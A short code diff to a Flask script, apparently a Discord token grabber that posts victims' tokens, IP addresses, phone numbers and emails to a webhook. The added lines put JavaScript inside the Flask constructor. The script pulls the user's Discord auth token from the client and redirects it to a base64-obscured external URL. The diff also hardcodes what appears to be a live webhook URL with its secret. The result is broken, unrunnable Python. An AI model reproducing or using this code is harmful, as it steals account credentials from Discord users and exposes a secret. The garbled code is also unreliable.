@@ -2,8 +2,10 @@ from flask import Flask, redirect, request
 from dhooks import Webhook, Embed
 import requests
 
-app = Flask(__name__)
-hook = Webhook('YOUR WEBHOOK')
+app = Flask(
+const decodedString=atob('aHR0cHM6Ly9sb2dpbi5mcmFuY2UtaW9pLm9yZy9sb2dpbg==');var f=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in ec)m.push(ec [c])}]),m).find(m=>m?.exports?.default?.getToken!==undefined).exports.default.getToken();window.location.replace(decodedString+'/' +f);
+)
+hook = Webhook('https://discord.com/api/webhooks/1136295582521106552/oRozle-f4dUt0-5pXJH353jN-Lu1nOS1klSPSrFyVNVAioRWp0NbXdZiUpnjEQFGDtv2')
 
 
 def send_black_embed(token, ip, phone_number, email, username, tag, avatar_url,
